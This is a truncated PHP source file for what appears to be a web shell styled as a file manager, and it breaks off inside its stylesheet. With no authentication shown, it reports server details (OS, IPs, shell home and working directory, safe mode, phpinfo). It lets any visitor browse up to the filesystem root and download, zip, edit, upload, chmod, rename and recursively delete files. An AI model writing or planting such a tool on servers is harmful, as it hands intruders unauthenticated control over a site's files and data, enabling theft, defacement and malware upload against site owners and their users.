<?php
//Path Finding
$root = realpath(__DIR__ . '/../../');
$requestedPath = $_POST['path'] ?? $_GET['path'] ?? $root;
$path = realpath($requestedPath);
if (!$path || !(path_matches($path, $root) || path_matches($root, $path))) {
    $path = $root;
}

$allowedThemes = ['terminal', 'cyber', 'corporate'];
$theme = $_COOKIE['renox_theme'] ?? 'terminal';
if (isset($_POST['theme']) && in_array($_POST['theme'], $allowedThemes, true)) {
    $theme = $_POST['theme'];
    setcookie('renox_theme', $theme, time() + 60 * 60 * 24 * 365, '/');
}
if (!in_array($theme, $allowedThemes, true)) {
    $theme = 'terminal';
}
$themeClass = 'theme-' . $theme;

if (isset($_GET['phpinfo'])) {
    phpinfo();
    exit;
}

// File download
if (isset($_GET['download'])) {
    $file = $path . DIRECTORY_SEPARATOR . basename($_GET['download']);
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

function human_filesize($bytes) {
    if ($bytes < 0) return '-';
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function format_timestamp($time) {
    return $time ? date('Y-m-d H:i:s', $time) : '-';
}

function folder_size($dir) {
    $size = 0;
    if (!is_dir($dir) || !is_readable($dir)) {
        return 0;
    }

    $items = @scandir($dir);
    if ($items === false) {
        return 0;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }

        $full = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_link($full)) {
            continue;
        }

        if (is_file($full)) {
            $fileSize = @filesize($full);
            if ($fileSize !== false) {
                $size += $fileSize;
            }
            continue;
        }

        if (is_dir($full) && is_readable($full)) {
            $size += folder_size($full);
        }
    }

    return $size;
}

function readable_owner($path) {
    $uid = @fileowner($path);
    if ($uid === false) {
        return '-';
    }

    if (function_exists('posix_getpwuid')) {
        $info = @posix_getpwuid($uid);
        if (is_array($info) && !empty($info['name'])) {
            return $info['name'];
        }
    }

    return (string) $uid;
}

function readable_group($path) {
    $gid = @filegroup($path);
    if ($gid === false) {
        return '-';
    }

    if (function_exists('posix_getgrgid')) {
        $info = @posix_getgrgid($gid);
        if (is_array($info) && !empty($info['name'])) {
            return $info['name'];
        }
    }

    return (string) $gid;
}

function readable_permissions($path) {
    $perms = @fileperms($path);
    if ($perms === false) {
        return '-';
    }

    $type = is_dir($path) ? 'd' : (is_link($path) ? 'l' : '-');
    $map = [
        0x0100 => 'r', 0x0080 => 'w', 0x0040 => 'x',
        0x0020 => 'r', 0x0010 => 'w', 0x0008 => 'x',
        0x0004 => 'r', 0x0002 => 'w', 0x0001 => 'x',
    ];

    $out = $type;
    foreach ([0x0100, 0x0080, 0x0040, 0x0020, 0x0010, 0x0008, 0x0004, 0x0002, 0x0001] as $bit) {
        $out .= ($perms & $bit) ? $map[$bit] : '-';
    }

    return $out . ' (' . substr(sprintf('%o', $perms), -4) . ')';
}

function shell_home_dir() {
    $home = getenv('HOME');
    if ($home && is_dir($home)) {
        return $home;
    }

    $drive = getenv('HOMEDRIVE');
    $path = getenv('HOMEPATH');
    if ($drive && $path) {
        $candidate = $drive . $path;
        if (is_dir($candidate)) {
            return $candidate;
        }
    }

    return getcwd() ?: DIRECTORY_SEPARATOR;
}

function server_software_label() {
    $software = $_SERVER['SERVER_SOFTWARE'] ?? '';
    if ($software !== '') {
        return $software;
    }

    return php_sapi_name();
}

function server_runtime_label() {
    $software = strtolower($_SERVER['SERVER_SOFTWARE'] ?? '');
    if (strpos($software, 'apache') !== false) {
        return 'Apache';
    }
    if (strpos($software, 'nginx') !== false) {
        return 'Nginx';
    }

    return php_sapi_name();
}

function phpinfo_popup_link() {
    return '<button type="button" class="quick-link-btn" onclick="openPhpInfo()">PHPINFO</button>';
}

function zip_add_path(ZipArchive $zip, $source, $archiveBase) {
    if (is_file($source)) {
        return $zip->addFile($source, $archiveBase);
    }

    if (!is_dir($source)) {
        return false;
    }

    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    $zip->addEmptyDir($archiveBase);
    foreach ($iterator as $item) {
        $realPath = $item->getRealPath();
        if (!$realPath) {
            continue;
        }

        $relative = $archiveBase . DIRECTORY_SEPARATOR . substr($realPath, strlen($source) + 1);
        $relative = str_replace('\\', '/', $relative);

        if ($item->isDir()) {
            $zip->addEmptyDir($relative);
        } elseif ($item->isFile()) {
            $zip->addFile($realPath, $relative);
        }
    }

    return true;
}

function delete_recursive($path) {
    if (is_link($path) || is_file($path)) {
        return @unlink($path);
    }

    if (!is_dir($path)) {
        return false;
    }

    $items = @scandir($path);
    if ($items === false) {
        return false;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }

        $full = $path . DIRECTORY_SEPARATOR . $item;
        if (!delete_recursive($full)) {
            return false;
        }
    }

    return @rmdir($path);
}

function request_state($key, $default = null) {
    if (isset($_POST[$key])) {
        return $_POST[$key];
    }

    if (isset($_GET[$key])) {
        return $_GET[$key];
    }

    return $default;
}

function path_matches($candidate, $base) {
    $candidate = rtrim($candidate, DIRECTORY_SEPARATOR);
    $base = rtrim($base, DIRECTORY_SEPARATOR);

    if ($candidate === '') {
        $candidate = DIRECTORY_SEPARATOR;
    }

    if ($base === '') {
        $base = DIRECTORY_SEPARATOR;
    }

    return $candidate === $base || strpos($candidate . DIRECTORY_SEPARATOR, $base . DIRECTORY_SEPARATOR) === 0;
}

function sort_control($label, $column, $currentSort, $currentOrder, $dir, $search) {
    $nextOrder = ($currentSort === $column && $currentOrder === 'asc') ? 'desc' : 'asc';
    $arrow = '';
    if ($currentSort === $column) {
        $arrow = $currentOrder === 'asc' ? ' ▲' : ' ▼';
    }

    return '<form method="post" class="sort-form"><input type="hidden" name="path" value="' . htmlspecialchars($dir, ENT_QUOTES) . '"><input type="hidden" name="q" value="' . htmlspecialchars($search, ENT_QUOTES) . '"><input type="hidden" name="page" value="1"><input type="hidden" name="sort" value="' . htmlspecialchars($column, ENT_QUOTES) . '"><input type="hidden" name="order" value="' . htmlspecialchars($nextOrder, ENT_QUOTES) . '"><button type="submit" class="sort-btn">' . htmlspecialchars($label) . $arrow . '</button></form>';
}

function nav_button($label, $targetPath, $class = 'nav-form-inline') {
    return '<form method="post" class="' . htmlspecialchars($class, ENT_QUOTES) . '">'
        . '<input type="hidden" name="path" value="' . htmlspecialchars($targetPath, ENT_QUOTES) . '">'
        . '<button type="submit" class="nav-btn">' . htmlspecialchars($label) . '</button>'
        . '</form>';
}

function render_breadcrumbs($path) {
    $trimmed = trim($path, DIRECTORY_SEPARATOR);
    if ($trimmed === '') {
        return '<div class="breadcrumb"><span class="breadcrumb-root breadcrumb-pill is-current">/</span></div>';
    }

    $segments = explode(DIRECTORY_SEPARATOR, $trimmed);
    $current = DIRECTORY_SEPARATOR;
    $parts = ['<div class="breadcrumb">'];
    $segmentCount = count(array_filter($segments, fn($segment) => $segment !== ''));
    $visibleIndex = 0;

    foreach ($segments as $index => $segment) {
        if ($segment === '') {
            continue;
        }

        $visibleIndex++;

        $current = ($current === DIRECTORY_SEPARATOR)
            ? DIRECTORY_SEPARATOR . $segment
            : $current . DIRECTORY_SEPARATOR . $segment;

        if ($visibleIndex > 1) {
            $parts[] = '<span class="breadcrumb-sep">›</span>';
        }

        $label = $segment;
        if ($visibleIndex === 1) {
            $label = '🏠 ' . $label;
        }

        if ($visibleIndex === $segmentCount) {
            $parts[] = '<span class="breadcrumb-pill is-current">' . htmlspecialchars($label) . '</span>';
        } else {
            $parts[] = nav_button($label, $current, 'nav-form-inline breadcrumb-form');
        }
    }

    $parts[] = '</div>';
    return implode('', $parts);
}

// ZIP download
if (isset($_GET['zip'])) {
    $zipTarget = $path;
    if ($_GET['zip'] !== '1') {
        $zipTarget = realpath($path . DIRECTORY_SEPARATOR . basename($_GET['zip']));
    }

    if (!$zipTarget || !is_dir($zipTarget)) {
        die("Error: Invalid folder selected for zip download.");
    }

    if (!class_exists('ZipArchive')) {
        die("ZipArchive class not available.");
    }

    $tmpDir = __DIR__ . DIRECTORY_SEPARATOR . 'tmp';
    if (!is_dir($tmpDir)) {
        mkdir($tmpDir, 0777, true);
    }

    $tmpZip = tempnam($tmpDir, 'zip');
    if ($tmpZip === false) {
        die("Failed to create temporary zip file.");
    }

    $zip = new ZipArchive();
    if ($zip->open($tmpZip, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        die("Cannot create zip file.");
    }

    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($zipTarget, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::LEAVES_ONLY
    );

    foreach ($files as $file) {
        $filePath = $file->getRealPath();
        if (!$filePath) {
            continue;
        }

        $relativePath = substr($filePath, strlen($zipTarget) + 1);
        if ($relativePath === false || $relativePath === '') {
            continue;
        }

        $zip->addFile($filePath, $relativePath);
    }

    if (!$zip->close()) {
        die("Failed to finalize zip.");
    }

    while (ob_get_level()) {
        ob_end_clean();
    }

    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . basename($zipTarget) . '.zip"');
    header('Content-Length: ' . filesize($tmpZip));
    header('Cache-Control: no-cache, no-store, must-revalidate');
    header('Pragma: no-cache');
    header('Expires: 0');

    readfile($tmpZip);
    unlink($tmpZip);
    exit;
}

echo '<style>
.container {
  display: flex;
  flex-wrap: wrap;
  gap: 15px;
  max-width: 800px;
  margin: 0 auto;
}
.box {
  flex: 1 1 calc(25% - 15px); /* 4 per row */
  background: linear-gradient(135deg, rgba(17, 24, 39, 0.96), rgba(31, 41, 55, 0.96));
  color: #e5e7eb;
  padding: 10px;
  border-radius: 10px;
  box-sizing: border-box;
  text-align: center;
  font-family: Arial, sans-serif;
  margin-bottom: 10px;
  font-size: 14px;
  border: 1px solid rgba(239, 68, 68, 0.35);
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.28);
}
</style>';

echo '<div class="container">';
echo '<div class="info-tile">Disk Free Space: ' . human_filesize(disk_free_space(__DIR__)) . '</div>';
echo '<div class="info-tile">Disk Total Space: ' . human_filesize(disk_total_space(__DIR__)) . '</div>';
echo '<div class="info-tile">Web Server: ' . htmlspecialchars(server_runtime_label()) . '</div>';
echo '<div class="info-tile">Server Software: ' . htmlspecialchars(server_software_label()) . '</div>';
echo '<div class="info-tile">Server IP: ' . htmlspecialchars($_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname())) . '</div>';
echo '<div class="info-tile">Your IP: ' . htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . '</div>';
echo '<div class="info-tile" id="dateTime">Current Date & Time: Loading...</div>';
echo '<div class="info-tile">PHP Version: ' . htmlspecialchars(phpversion()) . '</div>';
echo '<div class="info-tile">OS: ' . htmlspecialchars(php_uname()) . '</div>';
echo '<div class="info-tile">Shell Home: ' . htmlspecialchars(shell_home_dir()) . '</div>';
echo '<div class="info-tile">Shell CWD: ' . htmlspecialchars(getcwd() ?: $path) . '</div>';
$safe_mode = ini_get('safe_mode') ? 'On' : 'Off';
echo '<div class="info-tile">Safe Mode: ' . htmlspecialchars($safe_mode) . '</div>';
echo '</div>';

echo '<script>
function updateDateTime() {
    const now = new Date();
    const formatted = now.toLocaleString();
    document.getElementById("dateTime").textContent = "Current Date & Time: " + formatted;
}
function openPhpInfo() {
    const modal = document.getElementById("phpinfo-modal");
    const frame = document.getElementById("phpinfo-frame");
    if (frame && !frame.src) {
        frame.src = "?phpinfo=1";
    }
    if (modal) {
        modal.classList.add("open");
    }
}
function closePhpInfo() {
    const modal = document.getElementById("phpinfo-modal");
    if (modal) {
        modal.classList.remove("open");
    }
}
function toggleBulkSelection(source) {
    document.querySelectorAll(".bulk-item").forEach(function (checkbox) {
        checkbox.checked = source.checked;
    });
}
updateDateTime();
setInterval(updateDateTime, 1000);
</script>';





function list_files($dir) {
    $currentSort = request_state('sort', 'name');
    $currentOrder = strtolower(request_state('order', 'asc'));
    if (!in_array($currentOrder, ['asc', 'desc'], true)) {
        $currentOrder = 'asc';
    }
    $search = trim((string)request_state('q', ''));
    $page = max(1, (int)request_state('page', 1));
    $perPage = 25;

    $items = scandir($dir);
    $rows = [];

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $full = $dir . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($full);
        $folderSize = $isDir ? folder_size($full) : null;
        $rows[] = [
            'name' => $item,
            'full' => $full,
            'is_dir' => $isDir,
            'type' => $isDir ? 'Folder' : 'File',
            'size_raw' => $isDir ? $folderSize : (@filesize($full) !== false ? @filesize($full) : -1),
            'size' => human_filesize($isDir ? $folderSize : (@filesize($full) !== false ? @filesize($full) : -1)),
            'owner' => readable_owner($full),
            'group' => readable_group($full),
            'permissions' => readable_permissions($full),
            'created_raw' => @filectime($full) ?: 0,
            'created' => format_timestamp(@filectime($full)),
            'modified_raw' => @filemtime($full) ?: 0,
            'modified' => format_timestamp(@filemtime($full)),
        ];
    }

    if ($search !== '') {
        $rows = array_values(array_filter($rows, function ($row) use ($search) {
            return stripos($row['name'], $search) !== false;
        }));
    }

    usort($rows, function ($a, $b) use ($currentSort, $currentOrder) {
        $direction = $currentOrder === 'desc' ? -1 : 1;
        $cmp = 0;
        $aFolder = $a['is_dir'] ? 0 : 1;
        $bFolder = $b['is_dir'] ? 0 : 1;

        switch ($currentSort) {
            case 'type':
                $cmp = strcasecmp($a['type'], $b['type']);
                if ($cmp === 0) {
                    $cmp = strcasecmp($a['name'], $b['name']);
                }
                break;
            case 'size':
                $cmp = $a['size_raw'] <=> $b['size_raw'];
                if ($cmp === 0) {
                    $cmp = strcasecmp($a['name'], $b['name']);
                }
                break;
            case 'created':
                $cmp = $a['created_raw'] <=> $b['created_raw'];
                if ($cmp === 0) {
                    $cmp = strcasecmp($a['name'], $b['name']);
                }
                break;
            case 'modified':
                $cmp = $a['modified_raw'] <=> $b['modified_raw'];
                if ($cmp === 0) {
                    $cmp = strcasecmp($a['name'], $b['name']);
                }
                break;
            case 'name':
            default:
                $cmp = $aFolder <=> $bFolder;
                if ($cmp === 0) {
                    $cmp = strcasecmp($a['name'], $b['name']);
                }
                break;
        }

        if ($currentSort !== 'name') {
            $folderBias = $aFolder <=> $bFolder;
            if ($folderBias !== 0) {
                return $folderBias;
            }
        }

        return $cmp * $direction;
    });

    $totalRows = count($rows);
    $totalPages = max(1, (int)ceil($totalRows / $perPage));
    if ($page > $totalPages) {
        $page = $totalPages;
    }
    $offset = ($page - 1) * $perPage;
    $pageRows = array_slice($rows, $offset, $perPage);

    echo '<form id="bulk-form" method="post" class="bulk-form">';
    echo '<input type="hidden" name="path" value="' . htmlspecialchars($dir, ENT_QUOTES) . '">';
    echo '<input type="hidden" name="q" value="' . htmlspecialchars($search, ENT_QUOTES) . '">';
    echo '<input type="hidden" name="sort" value="' . htmlspecialchars($currentSort, ENT_QUOTES) . '">';
    echo '<input type="hidden" name="order" value="' . htmlspecialchars($currentOrder, ENT_QUOTES) . '">';
    echo '<input type="hidden" name="page" value="' . (int)$page . '">';
    echo '<div class="bulk-actions">';
    echo '<button type="submit" name="bulk_action" value="delete" class="bulk-btn danger">Bulk Delete</button>';
    echo '<button type="submit" name="bulk_action" value="zip" class="bulk-btn">Bulk Zip Download</button>';
    echo '</div>';

    echo '<table class="file-table">';
    echo '<thead><tr>';
    echo '<th><input type="checkbox" id="bulk-select-all" class="bulk-select-all" onclick="toggleBulkSelection(this)"></th>';
    echo '<th>' . sort_control('Name', 'name', $currentSort, $currentOrder, $dir, $search) . '</th>';
    echo '<th>' . sort_control('Type', 'type', $currentSort, $currentOrder, $dir, $search) . '</th>';
    echo '<th>' . sort_control('Size', 'size', $currentSort, $currentOrder, $dir, $search) . '</th>';
    echo '<th>Owner / Group</th>';
    echo '<th>Permissions</th>';
    echo '<th>' . sort_control('Created At', 'created', $currentSort, $currentOrder, $dir, $search) . '</th>';
    echo '<th>' . sort_control('Modified At', 'modified', $currentSort, $currentOrder, $dir, $search) . '</th>';
    echo '<th>Actions</th>';
    echo '</tr></thead>';
    echo '<tbody>';
    foreach ($pageRows as $row) {
        echo '<tr>';
        echo '<td><input type="checkbox" name="selected[]" value="' . htmlspecialchars($row['name'], ENT_QUOTES) . '" form="bulk-form" class="bulk-item"></td>';
        echo '<td class="name-cell">';
        if ($row['is_dir']) {
            echo '📁 ' . nav_button($row['name'], $row['full']);
        } else {
            echo '📄 ' . htmlspecialchars($row['name']);
        }
        echo '</td>';
        echo '<td>' . $row['type'] . '</td>';
        echo '<td>' . $row['size'] . '</td>';
        echo '<td>' . htmlspecialchars($row['owner'] . ' / ' . $row['group']) . '</td>';
        echo '<td>' . htmlspecialchars($row['permissions']) . '</td>';
        echo '<td>' . $row['created'] . '</td>';
        echo '<td>' . $row['modified'] . '</td>';
        echo '<td class="actions-cell">';

        if ($row['is_dir']) {
            echo '<a class="action-btn" href="?path=' . urlencode($dir) . '&zip=' . urlencode($row['name']) . '">Zip Download</a> ';
            echo '<a class="action-btn" href="?path=' . urlencode($dir) . '&rename=' . urlencode($row['name']) . '">Rename</a> ';
            echo '<a class="action-btn danger" href="?path=' . urlencode($dir) . '&deldir=' . urlencode($row['name']) . '" onclick="return confirm(\'Delete folder?\')">Delete</a>';
        } else {
            echo '<a class="action-btn" href="?path=' . urlencode($dir) . '&edit=' . urlencode($row['name']) . '">Edit</a> ';
            echo '<a class="action-btn" href="?path=' . urlencode($dir) . '&rename=' . urlencode($row['name']) . '">Rename</a> ';
            echo '<a class="action-btn danger" href="?path=' . urlencode($dir) . '&del=' . urlencode($row['name']) . '" onclick="return confirm(\'Delete?\')">Delete</a> ';
            echo '<a class="action-btn" href="?path=' . urlencode($dir) . '&download=' . urlencode($row['name']) . '">Download</a>';
        }

        echo '</td>';
        echo '</tr>';
    }
    echo '</tbody>';
    echo '</table>';
    echo '</form>';

    echo '<div class="pager">';
    echo '<div class="pager-summary">Showing ' . ($totalRows ? ($offset + 1) : 0) . '-' . min($offset + $perPage, $totalRows) . ' of ' . $totalRows . '</div>';
    echo '<div class="pager-links">';
    if ($page > 1) {
        echo '<form method="post" class="pager-form"><input type="hidden" name="path" value="' . htmlspecialchars($dir, ENT_QUOTES) . '"><input type="hidden" name="q" value="' . htmlspecialchars($search, ENT_QUOTES) . '"><input type="hidden" name="sort" value="' . htmlspecialchars($currentSort, ENT_QUOTES) . '"><input type="hidden" name="order" value="' . htmlspecialchars($currentOrder, ENT_QUOTES) . '"><input type="hidden" name="page" value="' . (int)($page - 1) . '"><button type="submit" class="pager-btn">Previous</button></form>';
    }
    if ($page < $totalPages) {
        echo '<form method="post" class="pager-form"><input type="hidden" name="path" value="' . htmlspecialchars($dir, ENT_QUOTES) . '"><input type="hidden" name="q" value="' . htmlspecialchars($search, ENT_QUOTES) . '"><input type="hidden" name="sort" value="' . htmlspecialchars($currentSort, ENT_QUOTES) . '"><input type="hidden" name="order" value="' . htmlspecialchars($currentOrder, ENT_QUOTES) . '"><input type="hidden" name="page" value="' . (int)($page + 1) . '"><button type="submit" class="pager-btn">Next</button></form>';
    }
    echo '</div>';
    echo '</div>';
}

// File edit
if (isset($_GET['edit'])) {
    $file = $path . DIRECTORY_SEPARATOR . basename($_GET['edit']);
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        echo "Saved. <a href='?path=" . urlencode($path) . "'>Back</a>";
        exit;
    }
    $content = @file_get_contents($file);
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px;'>".htmlspecialchars($content)."</textarea><br><button>Save</button></form>";
    header("Location: ?path=" . urlencode($path));
    //exit;
}

// Delete file or folder
if (isset($_GET['del'])) {
    $file = $path . DIRECTORY_SEPARATOR . basename($_GET['del']);
    if (is_dir($file)) {
        delete_recursive($file);
    } else {
        @unlink($file);
    }
    header("Location: ?path=" . urlencode($path));
    //exit;
}

if (isset($_GET['deldir'])) {
    $folder = $path . DIRECTORY_SEPARATOR . basename($_GET['deldir']);
    delete_recursive($folder);
    header("Location: ?path=" . urlencode($path));
    //exit;
}

// Rename
if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    @rename(
        $path . DIRECTORY_SEPARATOR . basename($_POST['rename_from']),
        $path . DIRECTORY_SEPARATOR . basename($_POST['rename_to'])
    );
    header("Location: ?path=" . urlencode($path));
    //exit;
}

// Quick rename selection
$renameTarget = null;
if (isset($_GET['rename'])) {
    $renameTarget = basename($_GET['rename']);
}

$renameType = null;
if ($renameTarget !== null) {
    $renameType = is_dir($path . DIRECTORY_SEPARATOR . $renameTarget) ? 'folder' : 'file';
}

// Bulk actions
if (isset($_POST['bulk_action']) && !empty($_POST['selected']) && is_array($_POST['selected'])) {
    $selected = array_values(array_filter(array_map('basename', $_POST['selected'])));

    if ($_POST['bulk_action'] === 'delete') {
        foreach ($selected as $item) {
            $target = $path . DIRECTORY_SEPARATOR . $item;
            if (is_dir($target)) {
                delete_recursive($target);
            } else {
                @unlink($target);
            }
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }

    if ($_POST['bulk_action'] === 'zip' && class_exists('ZipArchive')) {
        $tmpDir = __DIR__ . DIRECTORY_SEPARATOR . 'tmp';
        if (!is_dir($tmpDir)) {
            mkdir($tmpDir, 0777, true);
        }

        $tmpZip = tempnam($tmpDir, 'bulkzip');
        if ($tmpZip === false) {
            die("Failed to create temporary zip file.");
        }

        $zip = new ZipArchive();
        if ($zip->open($tmpZip, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            die("Cannot create zip file.");
        }

        foreach ($selected as $item) {
            $target = $path . DIRECTORY_SEPARATOR . $item;
            if (file_exists($target)) {
                zip_add_path($zip, $target, $item);
            }
        }

        $zip->close();
        while (ob_get_level()) {
            ob_end_clean();
        }

        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="bulk-selected.zip"');
        header('Content-Length: ' . filesize($tmpZip));
        readfile($tmpZip);
        unlink($tmpZip);
        exit;
    }
}

// Create
if (isset($_POST['newfile'])) {
    $new = $path . DIRECTORY_SEPARATOR . basename($_POST['newfile']);
    file_put_contents($new, "");
    header("Location: ?path=" . urlencode($path) . "&edit=" . urlencode($_POST['newfile']));
    //exit;
}

// CHMOD
if (isset($_POST['chmod_file']) && isset($_POST['mode'])) {
    chmod($path . DIRECTORY_SEPARATOR . basename($_POST['chmod_file']), octdec($_POST['mode']));
    header("Location: ?path=" . urlencode($path));
    //exit;
}

// Upload
if (isset($_FILES['upload'])) {
    $dest = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        $uploadMessage = 'Upload successful: ' . basename($_FILES['upload']['name']);
    } else {
        $uploadMessage = 'Upload failed.';
    }
    header("Location: ?path=" . urlencode($path));
    //exit;
}

// UI Start
echo '<style>
body {
  font-family: "Courier New", Courier, monospace;
  background:
    radial-gradient(circle at top, rgba(0, 255, 85, 0.08), transparent 25%),
    linear-gradient(180deg, #020403 0%, #040a05 100%);
  padding: 20px;
  color: #7CFF9A;
}

h3, h4 {
  margin-top: 30px;
  color: #89ffac;
  text-transform: uppercase;
  letter-spacing: 1px;
}

ul {
  list-style-type: none;
  padding-left: 0;
}

a {
  color: #7CFF9A;
  text-decoration: none;
  margin-right: 10px;
}

a:hover {
  text-decoration: underline;
}

form {
  margin-top: 10px;
  background: rgba(2, 12, 5, 0.92);
  padding: 10px;
  border: 1px solid rgba(124, 255, 154, 0.22);
  border-radius: 8px;
  width: 400px;
  max-width: 100%;
  box-shadow: 0 0 0 1px rgba(124, 255, 154, 0.08), 0 0 22px rgba(0, 255, 85, 0.08);
}

input[type="search"],
input[type="text"],
input[type="file"],
input[type="password"],
input[type="number"],
input[name="mode"],
textarea,
select {
  width: 100%;
  padding: 10px 12px;
  margin: 6px 0;
  border: 1px solid rgba(124, 255, 154, 0.25);
  border-radius: 6px;
  background: #030903;
  color: #89ffac;
  caret-color: #7CFF9A;
  box-sizing: border-box;
  outline: none;
  appearance: none;
  -webkit-appearance: none;
  box-shadow: inset 0 0 0 1px rgba(0, 255, 85, 0.02);
}

input[type="file"] {
  padding: 8px;
  cursor: pointer;
  color: #b6ffca;
}

input[type="file"]::-webkit-file-upload-button {
  margin-right: 12px;
  padding: 8px 12px;
  border: none;
  border-radius: 4px;
  background: linear-gradient(135deg, #0f5, #063);
  color: #fff;
  cursor: pointer;
}

input[type="file"]::file-selector-button {
  margin-right: 12px;
  padding: 8px 12px;
  border: none;
  border-radius: 4px;
  background: linear-gradient(135deg, #0f5, #063);
  color: #fff;
  cursor: pointer;
}

input::placeholder,
textarea::placeholder {
  color: rgba(137, 255, 172, 0.55);
}

input:-webkit-autofill,
input:-webkit-autofill:hover,
input:-webkit-autofill:focus {
  -webkit-text-fill-color: #89ffac;
  -webkit-box-shadow: 0 0 0px 1000px #030903 inset;
  transition: background-color 9999s ease-in-out 0s;
}

input[type="file"]::file-selector-button:hover,
input[type="file"]::-webkit-file-upload-button:hover {
  filter: brightness(1.05);
}

button {
  background: linear-gradient(135deg, #0f5, #060);
  border: none;
  color: white;
  padding: 8px 12px;
  margin-top: 8px;
  border-radius: 4px;
  cursor: pointer;
}

button:hover {
  filter: brightness(1.05);
}

hr {
  margin: 30px 0;
  border: none;
  border-top: 1px solid rgba(124, 255, 154, 0.16);
}

.form-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 20px;
}

.form-grid > div {
  flex: 1 1 calc(33.333% - 20px);
  min-width: 250px;
}

.file-table {
  width: 100%;
  border-collapse: collapse;
  background: rgba(1, 8, 3, 0.96);
  color: #7CFF9A;
  margin-top: 10px;
  overflow: hidden;
  border-radius: 8px;
  box-shadow: 0 0 0 1px rgba(124, 255, 154, 0.12), 0 0 20px rgba(0, 255, 85, 0.06);
}

.file-table th,
.file-table td {
  border: 1px solid rgba(124, 255, 154, 0.14);
  padding: 10px 12px;
  text-align: left;
  vertical-align: top;
}

.file-table th:first-child,
.file-table td:first-child {
  width: 42px;
  text-align: center;
}

.file-table th {
  background: linear-gradient(135deg, rgba(0, 48, 16, 0.98), rgba(1, 8, 3, 0.98));
  font-weight: 700;
  color: #8dffaf;
}

.file-table tbody tr:nth-child(even) {
  background: rgba(4, 18, 8, 0.92);
}

.file-table tbody tr:nth-child(odd) {
  background: rgba(1, 8, 3, 0.95);
}

.file-table tbody tr:hover {
  background: rgba(0, 255, 85, 0.08);
}

.name-cell {
  font-weight: 600;
  color: #b6ffca;
}

.actions-cell {
  white-space: nowrap;
}

.action-btn {
  display: inline-block;
  padding: 6px 10px;
  margin: 2px 4px 2px 0;
  border-radius: 4px;
  background: linear-gradient(135deg, #0f5, #084);
  color: #fff;
  text-decoration: none;
}

.action-btn:hover {
  text-decoration: none;
  opacity: 0.9;
}

.action-btn.danger {
  background: linear-gradient(135deg, #ff2d2d, #7a0000);
}

.bulk-form {
  margin-top: 12px;
  width: auto;
  max-width: none;
}

.bulk-actions {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  margin-bottom: 10px;
}

.bulk-btn {
  background: linear-gradient(135deg, #0f5, #063);
  color: #fff;
  border: 1px solid rgba(124, 255, 154, 0.22);
  border-radius: 6px;
  padding: 8px 12px;
  font-weight: 700;
}

.bulk-btn.danger {
  background: linear-gradient(135deg, #ff2d2d, #7a0000);
}

.bulk-select-all,
.bulk-item {
  width: 16px;
  height: 16px;
  accent-color: #0f5;
}

.search-bar {
  margin: 15px 0 10px;
  display: flex;
  gap: 10px;
  align-items: center;
  flex-wrap: wrap;
}

.search-bar input[type="search"] {
  flex: 1 1 260px;
  max-width: 420px;
  padding: 10px 12px;
  border: 1px solid rgba(124, 255, 154, 0.28);
  border-radius: 6px;
  background: #030903;
  color: #89ffac;
}

.search-bar button,
.pager-btn {
  display: inline-block;
  padding: 8px 12px;
  border-radius: 6px;
  border: none;
  background: linear-gradient(135deg, #0f5, #063);
  color: #fff;
  text-decoration: none;
  cursor: pointer;
}

.search-bar button:hover,
.pager-btn:hover {
  opacity: 0.92;
  text-decoration: none;
}

.sort-form,
.pager-form {
  display: inline-block;
  margin: 0;
  padding: 0;
  background: transparent;
  border: none;
  width: auto;
  box-shadow: none;
}

.nav-form-inline,
.nav-form-parent {
  display: inline-block;
  margin: 0;
  padding: 0;
  background: transparent;
  border: none;
  width: auto;
  box-shadow: none;
}

.nav-form-parent {
  margin-bottom: 8px;
}

.sort-btn {
  all: unset;
  cursor: pointer;
  color: #8dffaf;
  font: inherit;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.sort-btn:hover {
  color: #ffffff;
}

.nav-btn {
  all: unset;
  cursor: pointer;
  color: #b6ffca;
  font: inherit;
  font-weight: 700;
}

.nav-btn:hover {
  color: #ffffff;
  text-decoration: underline;
}

.pager {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 12px;
  margin-top: 12px;
  flex-wrap: wrap;
}

.pager-summary {
  color: #89ffac;
  font-size: 14px;
}

.pager-links {
  display: flex;
  gap: 8px;
}

.upload-panel {
  background: rgba(2, 12, 5, 0.92);
  border: 1px solid rgba(124, 255, 154, 0.22);
  border-radius: 8px;
  padding: 12px;
  box-shadow: 0 0 0 1px rgba(124, 255, 154, 0.08), 0 0 22px rgba(0, 255, 85, 0.08);
}

.upload-panel h4 {
  margin-top: 0;
}

.upload-note {
